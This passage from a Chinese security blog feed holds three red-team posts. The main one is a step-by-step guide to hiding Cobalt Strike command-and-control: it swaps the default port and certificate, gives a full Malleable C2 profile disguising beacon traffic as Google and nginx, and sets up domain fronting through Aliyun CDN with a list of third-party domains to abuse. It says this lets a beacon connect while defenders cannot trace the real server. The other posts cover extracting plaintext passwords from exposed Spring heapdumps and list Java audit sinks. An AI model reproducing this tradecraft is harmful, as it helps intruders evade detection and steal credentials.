href="#1-修改默认端口" class="headerlink" title="1.修改默认端口"></a>1.修改默认端口</h3><p>第一种是直接编辑teamserver进行启动项修改</p><ul><li>./teamserver 1.1.1.1 password<br>直接修改teamserver<br>vim teamserver<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16007608342084.jpg" alt="-w895"></li></ul><p>第二种是启动的时候指定server_port端口</p><ul><li>java -XX:ParallelGCThreads=4 -Duser.language=en -Dcobaltstrike.server_port=50505 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -Xmx1024m -classpath ./cobaltstrike.jar server.TeamServer xxx.xxx.xx.xx test google.profile</li></ul><h3 id="2-去除证书特征"><a href="#2-去除证书特征" class="headerlink" title="2.去除证书特征"></a>2.去除证书特征</h3><p>进入cs目录<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16007592723678.jpg" alt="-w744"></p><p>查看keytool -list -v -keystore cobaltstrike.store 证书情况，输入默认密码123456回车，可以看到所有者、发布者中Cobalt Strike相关字样。</p><p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16008655945864.jpg" alt="-w807"></p><p><strong>keytool</strong>是一个Java 数据证书的管理工具，使用如下：<br>keytool -keystore cobaltstrike.store -storepass 密码 -keypass 密码 -genkey -keyalg RSA -alias google.com -dname “CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)</p><p>example:<br><code>keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias google.com -dname &quot;CN=US, OU=google.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN&quot;</code></p><p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16008656484876.jpg" alt="-w821"></p><p>未修改cobaltstrike.store前<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16007653043551.jpg" alt="-w906"></p><p>修改cobaltstrike.store后，可以看到cobalt strike等关键字样已经去除<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16007654547114.jpg" alt="-w761"></p><p>google.profile模版可以参考<a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/APT/">C2.profile</a>和<a href="https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.0.profile">malleable-c2</a><br>设置后，可以看到访问/image/后已经返回的是我们设置好的header 了<br>“Content-Type” “img/jpg”;<br>“Server” “nginx/1.10.3 (Ubuntu)”;</p><p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16007642149827.jpg" alt="-w1273"></p><p>部分引用源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># cs profile</span><br><span class="line">#   http://www.secureworks.com/cyber-threat-intelligence/threats/secrets-of-the-comfoo-masters/</span><br><span class="line">#   https://github.com/rsmudge/Malleable-C2-Profiles/</span><br><span class="line"># Author: @keyi</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">set sample_name &quot;google&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;/image/&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http://www.google.com&quot;;</span><br><span class="line">        header &quot;Pragma&quot; &quot;no-cache&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;no-cache&quot;;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            append &quot;-.jpg&quot;;</span><br><span class="line">            uri-append;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Content-Type&quot; &quot;img/jpg&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx/1.10.3 (Ubuntu)&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;/history/&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http://www.google.com&quot;;</span><br><span class="line">        header &quot;Pragma&quot; &quot;no-cache&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;no-cache&quot;;</span><br><span class="line"></span><br><span class="line">        id &#123;</span><br><span class="line">            netbiosu;</span><br><span class="line">            append &quot;.asp&quot;;</span><br><span class="line">            uri-append;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Content-Type&quot; &quot;img/jpg&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS/6.0&quot;;</span><br><span class="line">        header &quot;X-Powered-By&quot; &quot;ASP.NET&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-修改Cobalt-Strike-dns-idle"><a href="#3-修改Cobalt-Strike-dns-idle" class="headerlink" title="3.修改Cobalt Strike dns_idle"></a>3.修改Cobalt Strike dns_idle</h3><p>0.0.0.0是Cobalt Strike DNS Beacon特征可设置Malleable C2进行修改<br>输入set dns_idle “8.8.8.8”;</p><hr><h2 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote><p>域前置（英语：<em>Domain fronting*），是一种隐藏连接真实端点来规避互联网审查的技术。在应用层上运作时，域前置使用户能通过HTTP连接到白名单域名（如</em>.google.cn），无直接与C2服务器的通信。<br>介绍：被攻击机器 -&gt; <code>www.microport.com</code>(走aliyun cdn的域名，根据设定的host头: dns.google.cn找到对应的vps_ip) -&gt; cdn流量转发到vps_ip(c2真实地址)<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16008630852868.jpg" alt="-w804"></p></blockquote><h3 id="实战配置CDN"><a href="#实战配置CDN" class="headerlink" title="实战配置CDN"></a>实战配置CDN</h3><p>购买云服务器，开通CDN服务。<br>加速域名：随便填个高信誉的域名实现域名伪造，例如：<strong>oss.microsoft.com</strong>，<strong>dns.google.com</strong>之类的。</p><p>登陆aliyun<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16008566561379.jpg" alt="-w1296"></p><p>在IP位置填写cs_teamserver的IP地址<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16008635700611.jpg" alt="-w682"></p><p>配置c2的Stager的域名为走cdn的地址，如<code>www.microport.com.cn</code><br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16008566905789.jpg" alt=""></p><figure class="highlight plaintext"><figcaption><span>cdn的。其中```dns.google.cn```是伪造的域名地址，目的是目标机器访问cdn的时候可以根据google.cn特征找到对应的vps_ip。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有没人跟我有相同的疑问，这个走aliyun的cdn域名如何获取。这边波师傅给我提供了一些，可能域名作废或者不走cdn了，大家可以根据curl做一下测试。</span><br></pre></td></tr></table></figure><p>admin.bjexpo.com<br>admin.cailianpress.com<br>admin.cheyian.com<br>admin.cydf.com<br>admin.ebp2p.com<br>admin.k3.cn<br>admin.ks5u.com<br>admin.kyjxy.com<br>admin.lezi.com<br>admin.weiba66.com<br>admin.wuzhenfestival.com<br>admin.xingfujie.cn<br>admin.yxp2p.com<br>anxin360.com<br>api.3658mall.com<br>api.bjexpo.com<br>api.cheyian.com<br>api.cydf.com<br>api.ebp2p.com<br>api.ks5u.com<br>api.kyjxy.com<br>api.lanjinger.com<br>api.my089.com<br>api.thecover.cn<br>api.uiyi.cn<br>api.utcard.cn<br>api.weiba66.com<br>api.wuzhenfestival.com<br>api.xingfujie.cn<br>api.yxp2p.com<br>api.zaozuo.com<br>app.bjexpo.com<br>app.chanjet.com<br>app.cheyian.com<br>app.ebp2p.com<br>app.eeo.com.cn<br>app.gfedu.cn<br>app.guojimami.com<br>app.hao24.cn<br>app.hrmarket.net<br>app.k3.cn<br>app.kyjxy.com<br>app.lanjinger.com<br>app.lezi.com<br>app.meiduimall.com<br>app.sanqin.com<br>app.sanqin.com</p><pre><code>配置成功后，输入```curl -v &quot;www.microport.com/een&quot; -H &quot;Host:dns.google.cn&quot;```可以查看cs的weblog,看见请求/een的日志，证明配置成功。![-w515](https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16008616463869.jpg)cs生成Windows exe，运行成功上线.可以看到14.17.67.46 东莞IP上线。无直接跟c2连接的域名信息，这样来说蓝队在防守的时候看到的是白名单域名，并且也无法溯源到我们真实的vps地址。![-w1361](https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16008616103122.jpg)## 参考[Cobalt Strike特征修改](https://www.cnblogs.com/websecyw/p/12058948.html)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Cobalt-Strike-绕过流量审计&quot;&gt;&lt;a href=&quot;#Cobalt-Strike-绕过流量审计&quot; class=&quot;headerlink&quot; title=&quot;Cobalt Strike 绕过流量审计&quot;&gt;&lt;/a&gt;Cobalt Strike 绕过流量审计&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="redteam" scheme="http://yoursite.com/categories/redteam/"/>
    
    
      <category term="redteam" scheme="http://yoursite.com/tags/redteam/"/>
    
  </entry>
  
  <entry>
    <title>MAT 查找 spring heapdump 中的密码明文</title>
    <link href="http://yoursite.com/2020/08/25/SpringBootHeapdump/"/>
    <id>http://yoursite.com/2020/08/25/SpringBootHeapdump/</id>
    <published>2020-08-25T02:41:23.000Z</published>
    <updated>2020-08-25T03:18:10.270Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 <strong>**</strong> 号替换，以达到脱敏的效果。<br>在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。<br>这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1 直接下载<strong><a href="http://xx.xx.xx.xx/heapdump">http://xx.xx.xx.xx/heapdump</a></strong> 或者<strong><a href="http://xx.xx.xx.xx/actuator/heapdump">http://xx.xx.xx.xx/actuator/heapdump</a></strong> (spring2.x 修改了路径)</p><p>2 这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文</p><p>3 使用<a href="https://www.o2oxy.cn/wp-content/uploads/2020/05/MemoryAnalyzer.zip"> Eclipse Memory Analyzer</a> 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入,再点击感叹号运行下列语句。前者Spring1.x 后者Spring2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from org.springframework.web.context.support.StandardServletEnvironment</span><br><span class="line">或者</span><br><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure><p>4 成功查询到密码，结合/env页面泄漏的信息可以知道是jdbc还是邮箱的密码等<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/25/15983217624960.jpg" alt="-w1187"></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1 select语句中的关键字password替换为其他mail关键字进行fuzz</p><p>2 heapdump 泄漏的反序列化点是否可以被我们黑盒利用</p><p>3 可以结合/env页面泄漏的信息猜测其他敏感内容rce，比如sso的ak和sk等</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://fanyibo2009.github.io/">欢迎查看无尾熊blog</a><br><a href="http://vulsee.com/archives/vulsee_2020/0807_11841.html">spring boot 获取被星号脱敏的密码的明文</a><br><a href="https://mp.weixin.qq.com/s/YirHAXg3VZXA3Znj4L6xSw">xray社区记一次信息泄漏到RCE</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前景&quot;&gt;&lt;a href=&quot;#前景&quot; class=&quot;headerlink&quot; title=&quot;前景&quot;&gt;&lt;/a&gt;前景&lt;/h2&gt;&lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值
      
    
    </summary>
    
    
      <category term="代码" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="黑盒测试" scheme="http://yoursite.com/tags/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>java代码审计思路</title>
    <link href="http://yoursite.com/2020/08/24/CodeAudit/"/>
    <id>http://yoursite.com/2020/08/24/CodeAudit/</id>
    <published>2020-08-24T04:04:37.000Z</published>
    <updated>2020-08-24T05:03:17.800Z</updated>
    
    <content type="html"><![CDATA[<p>常见的审计思路<br>1.查看目录结构，查看配置文件，判断框架信息<br>2.查看使用的类库包是否安全<br>3.filter、controller<br>4.数据查询<br>5.危险函数审计<br>6.查看xml配置的数据库信息和文件信息<br>7.黑盒测试对应白盒测试功能点</p><p>spring mvc-ssh标准结构<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793539536195.jpg" alt=""><br>spring-mvc框架<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15830545953263.jpg" alt="-w658"></p><p>applicationContext.xml<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793539686059.jpg" alt=""></p><p>正向审计是查看程序功能点与代码对应关系<br>反向审计是搜索函数去查找功能点</p><p>readObject（）实例具体步骤<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793600856289.jpg" alt=""></p><p>mvn结构详解<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793601189838.jpg" alt=""></p><h2 id="常见sping-mvc和spring-boot区别"><a href="#常见sping-mvc和spring-boot区别" class="headerlink" title="常见sping-mvc和spring-boot区别"></a>常见sping-mvc和spring-boot区别</h2><p>1.下载源码解压以后查看是否有web.xml，有的化就是spring-mvc,没有的化就是注解模式-spring-boot</p><p>存在 web.xml 配置的 java web 项目，servlet3.0 的 java web 项目，springboot 内嵌容器的 java web 项目加载 servlet，filter，listener 的</p><p>ServletContainerInitializer 也是 Servlet 3.0 新增的一个接口，容器在启动时使用 JAR 服务 API(JAR Service API) 来发现 ServletContainerInitializer 的实现类，并且容器将 WEB-INF/lib 目录下 JAR 包中的类都交给该类的 onStartup() 方法处理，我们通常需要在该实现类上使用 @HandlesTypes 注解来指定希望被处理的类，过滤掉不希望给 onStartup() 处理的类。</p><p>一个典型的 servlet3.0+ 的 web 项目结构如下：<br>.<br>├── pom.xml<br>└── src<br>    ├── main<br>    │   ├── java<br>    │   │   └── moe<br>    │   │       └── cnkirito<br>    │   │           ├── CustomServletContainerInitializer.java<br>    │   │           ├── filter<br>    │   │           │   └── HelloWorldFilter.java<br>    │   │           └── servlet<br>    │   │               └── HelloWorldServlet.java<br>    │   └── resources<br>    │       └── META-INF<br>    │           └── services<br>    │               └── javax.servlet.ServletContainerInitializer<br>    └── test<br>        └── java</p><p>注册方式一：servlet3.0注解+@ServletComponentScan<br>springboot 依旧兼容 servlet3.0 一系列以 @Web* 开头的注解：@WebServlet，@WebFilter，@WebListener</p><p>@WebServlet(“/hello”)<br>public class HelloWorldServlet extends HttpServlet{}</p><p>注册方式二：RegistrationBean<br>@Bean<br>public ServletRegistrationBean helloWorldServlet() {<br>    ServletRegistrationBean helloWorldServlet = new ServletRegistrationBean();<br>    myServlet.addUrlMappings(“/hello”);<br>    myServlet.setServlet(new HelloWorldServlet());<br>    return helloWorldServlet;<br>}</p><p>@Bean<br>public FilterRegistrationBean helloWorldFilter() {<br>    FilterRegistrationBean helloWorldFilter = new FilterRegistrationBean();<br>    myFilter.addUrlPatterns(“/hello/*”);<br>    myFilter.setFilter(new HelloWorldFilter());<br>    return helloWorldFilter;<br>}</p><h2 id="常见web-api框架"><a href="#常见web-api框架" class="headerlink" title="常见web-api框架"></a>常见web-api框架</h2><h3 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h3><p>webervice<br>    -soap<br>    -WSDL<br>    -UDDI<br>    -调用RPC与消息传递<br>    -restful接口<br>    -swagger<br>DWr<br>Hessian<br>GWT接口<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793279189535.jpg" alt="-w1141"></p><h4 id="WEBSERVICE接口"><a href="#WEBSERVICE接口" class="headerlink" title="WEBSERVICE接口"></a>WEBSERVICE接口</h4><p>漏洞点<br>1.默认的安全配置<br>2.未授权的访问<br>3.自身未修复漏洞</p><p>burp常见的样式，后缀是.wsdl<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793294814921.jpg" alt="-w429"><br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793295045371.jpg" alt="-w433"></p><p>service，serivces，ws，webservice</p><h5 id="swagger-接口"><a href="#swagger-接口" class="headerlink" title="swagger 接口"></a>swagger 接口</h5><p>在pom.xml中添加Swagger依赖<br>创建Swagger配置类，与Application.java同级目录</p><p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793282856854.jpg" alt=""><br>常见的路径是<br>/swagger-ui.html</p><p>swagger测试网站<br><a href="http://editor.swagger.io/">http://editor.swagger.io/</a><br><a href="https://github.com/swagger-api/swagger-editor/releases">https://github.com/swagger-api/swagger-editor/releases</a></p><h5 id="RESTful接口"><a href="#RESTful接口" class="headerlink" title="RESTful接口"></a>RESTful接口</h5><p>RESTFUL是一种网络应用程序的设计风格和开发方式，基于HTTP，可以使用XML格式定义或JSON格式定义</p><p>在Restful<br><a href="http://127.0.0.1/user/query/1">http://127.0.0.1/user/query/1</a> GET 根据用户id查询用户数据<br><a href="http://127.0.0.1/user/save">http://127.0.0.1/user/save</a> POST 新增用户<br><a href="http://127.0.0.1/user/update">http://127.0.0.1/user/update</a> POST 修改用户信息<br><a href="http://127.0.0.1/user/delete/1">http://127.0.0.1/user/delete/1</a> GET/POST 删除用户信息</p><p>RESTful用法：<br><a href="http://127.0.0.1/user/1">http://127.0.0.1/user/1</a> GET 根据用户id查询用户数据<br><a href="http://127.0.0.1/user">http://127.0.0.1/user</a> POST 新增用户<br><a href="http://127.0.0.1/user">http://127.0.0.1/user</a> PUT 修改用户信息<br><a href="http://127.0.0.1/user">http://127.0.0.1/user</a> DELETE 删除用户信息</p><h5 id="soap"><a href="#soap" class="headerlink" title="soap"></a>soap</h5><p>使用工具是soapui<br>soap请求 (Simple Object Access Protocol，简单对象访问协议) 是HTTP POST的一个专用版本，遵循一种特殊的xml消息格式Content-type设置为: text/xml任何数据都可以xml化。</p><h4 id="DWR接口"><a href="#DWR接口" class="headerlink" title="DWR接口"></a>DWR接口</h4><p>web.xml<br><init-param><br>            <param-name>debug</param-name><br>            <param-value>true</param-value><br></init-param><br><servlet-mapping><br>        <servlet-name>dwr-invoker</servlet-name><br>        <url-pattern>/dwr/*</url-pattern><br></servlet-mapping><br>dwr.xml<br><create javascript="commonparams" creator="new"></p><param name="class" value="com.example.dwr.commontest.CommonParams" /></create><p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793294153241.jpg" alt="-w586"></p><p>漏洞点<br>1.默认的安全配置项<br>2.未授权的访问<br>3.Debug状态下的问题</p><p>/dwr/index.html，/exec/index.html<br>HESSIAN接口<br>GWT接口</p><h4 id="HESSIAN接口"><a href="#HESSIAN接口" class="headerlink" title="HESSIAN接口"></a>HESSIAN接口</h4><servlet-mapping>     <servlet-name>         HessianSpringInvokeService     </servlet-name><url-pattern>/*.hessian</url-pattern></servlet-mapping>web.xml<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;</span><br><span class="line">xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;</span><br><span class="line">xsi:schemaLocation=&quot;</span><br><span class="line">    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd</span><br><span class="line">    http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-2.0.xsd</span><br><span class="line">    http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-2.0.xsd&quot;&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;!-- hessian服务通过spring暴露出去 --&gt;</span><br><span class="line">  &lt;bean id =&quot;EncryptService.hessian&quot; class =&quot;com.ufgov.admin.license.svc.EncryptServiceImpl&quot;&gt;</span><br><span class="line">  &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>看访问的文件格式默认是.hession看content-type中：x-application/hession![-w922](https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793297519770.jpg)![-w768](https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793297646908.jpg)![-w910](https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793297829526.jpg)<p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793298098840.jpg" alt="-w910"></p><p>1.未授权的访问<br>2.自带绕waf光环<br>3.自身未修复漏洞</p><h4 id="GWT接口"><a href="#GWT接口" class="headerlink" title="GWT接口"></a>GWT接口</h4><p>漏洞<br>1.未授权访问<br>2.自带绕waf光环<br>3.接口枚举猜测</p><servlet><servlet-name>greetServlet</servlet-name><servlet-class>com.google.gwt.sample.validation.server.GreetingServiceImpl</servlet-class></servlet><servlet-mapping><servlet-name>greetServlet</servlet-name><url-pattern>/gwtrpcservlet</url-pattern></servlet-mapping>web.xml<p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793299162725.jpg" alt="-w605"></p><h2 id="idea快捷键"><a href="#idea快捷键" class="headerlink" title="idea快捷键"></a>idea快捷键</h2><p>搜索文件名 shift 双击<br>Ctrl+N 按名字搜索类<br>在按照文本的内容查找 Control + Shift + F<br>Ctrl+Shift+N按文件名搜索文件<br>Ctrl+H 查看类的继承关系，例如HashMap的父类是AbstractMap<br>Ctrl+Alt+B查看子类方法实现 或者 Ctrl+Alt+鼠标左键<br>Ctrl+B可以查看父类或父方法定义，但是不如ctrl+鼠标左键方便<br>Alt+F7查找类或方法在哪被使用<br>显示便捷提示和快速修复 cmd + Enter<br>快速生成代码 Control + Enter<br>选中方法，查看参数信息 Cmd + P<br>弹出当前打开的文件列表 Cmd + E<br>根据0到9之间的数字，打开各个相应的工具窗口  Cmd+num 0-9<br>打开整个IDEA属性配置对话框 cmd + ,<br>查找当前文件 Cmd + F<br>快速定位到某一行某一列  Cmd + G<br>环绕选中代码块，生成注释 cmd + option + T<br>注释代码或者取消注释  Cmd + /<br>格式化代码  Cmd + option + L<br>优化导入，删除掉没用被使用的导入  Cmd + Option + O<br>缩进选中的行 tab<br>取消缩进选中的行 shift + tab<br>选中的单词或者代码，切换大小写  cmd + shift + u<br>返回或者前进最近编辑的地方 cmd + option + &lt;- -&gt;<br>打开变量声明处 cmd + B 或者 cmd + 鼠标左键<br>打开类型声明处 cmd + shift + B<br>插入注释模板 CMD + j </p><h3 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h3><p><strong>java命令执行审计</strong><br> ProcessBuilder.start()<br> Runtime.getRuntime().exec()<br> GroovyShell.evaluate()<br> exec、cmd、shell</p><p> 如需用户输入参数，则对用户输入做严格校验，如&amp;&amp;、|、;等<br> 避免命令用户可控</p><p> <strong>java反序列化审计</strong><br>  从上可得出结论，如果一个类需要序列化那么需要这个类或者父类实现 Serializable或者Externalizable接口。<br>对一个类进行序列化需要执行ObjectOutputStream.writeObject方法写入 对象<br>对一个类进行反序列化需要ObjectInputStream.readObject从输入流中读 取字节然后转换成对象<br>在反序列的过程中，被反序列化操作的类不会执行构造方法。<br> Serializable<br>Externalizabl<br>Externalizable<br>Transient<br>ObjectOutputStream.writeObject<br>readObject<br>writeObject<br>ObjectInputStream.readObject<br>ObjectInputStream.readUnshared<br>XMLDecoder.readObject<br>Yaml.load<br>XStream.fromXML<br>ObjectMapper.readValue<br>JSON.parseObject</p><p><strong>任意文件上传</strong><br>ServletFileUpload<br>FileItemStream<br>MultipartFile<br>new FileInputStream()<br>new FileOutputStream()<br>new File()<br>new BufferedReader()<br>new ServletFileUpload()<br>new MultipartFile()<br>CommonsMultipartFile<br>printWrite<br>upload，write,fileName ,filePath<br>MultipartFile<br>createNewFile<br>FileInputStream</p><p><strong>任意文件下载</strong><br>download 、<br>fileName 、<br>filePath、<br>write、<br>getFile、<br>getWriter</p><p><strong>任意文件删除</strong><br>delete, deleteFile,fileName ,filePath</p><p><strong>CSRF</strong><br>审计方法:通过查看配置文件有没有配置 csrf 全局过滤器，如果没有则重点看每个操作前有 没有添加 token 的防护机制</p><p><strong>输入方面进行总结</strong><br>? request.getQueryString() ? request.getParameterMap() ? request.getParameterNames() ? request.getParameter() ? request.getHeader() ? request.getHeaders() ? request.getHeaderNames() ? req.getInputStream() ? ⋯⋯.</p><p><strong>sql注入</strong><br>? prepareStatement()<br>? createStatement()<br> ? executeQuery()<br>? executeUpdate()<br>? execute()<br>$（） #<br>Select、Dao 、from 、delete 、update、insert</p><ul><li>append</li></ul><p><strong>缓冲区溢出</strong><br>strcpy,strcat,scanf,memcpy,memmove,memeccpy 